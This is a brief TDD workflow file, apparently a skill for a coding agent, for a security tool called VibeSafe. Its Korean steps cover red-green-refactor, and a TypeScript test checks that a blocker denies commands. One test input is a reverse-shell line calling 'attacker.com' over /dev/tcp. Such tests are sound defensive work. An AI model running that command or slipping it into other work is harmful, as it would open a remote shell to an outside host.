---
name: tdd-workflow
description: VibeSafe TDD 워크플로우. 보안 로직 구현 시 반드시 사용.
---

# TDD for Security Code

## Process

1. **RED** - 실패 테스트 작성
   - 예상 입력/출력 정의
   - 엣지 케이스 포함 (빈 문자열, 특수문자, 유니코드)

2. **GREEN** - 최소 코드로 통과
   - 테스트 통과만을 목표
   - 최적화는 나중에

3. **REFACTOR** - 정리
   - 중복 제거
   - 테스트 여전히 통과 확인

## Security Test Examples

```typescript
describe('InstantBlock', () => {
  it('should block reverse shell patterns', () => {
    const input = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';
    expect(checkInstantBlock(input)).toEqual({
      behavior: 'deny',
      message: expect.stringContaining('reverse shell')
    });
  });

  it('should allow normal bash commands', () => {
    const input = 'npm install lodash';
    expect(checkInstantBlock(input)).toBeNull();
  });
});
```

## Rules

- 보안 패턴 추가 시 반드시 테스트 먼저
- False positive/negative 테스트 케이스 필수
- 80%+ 커버리지 유지
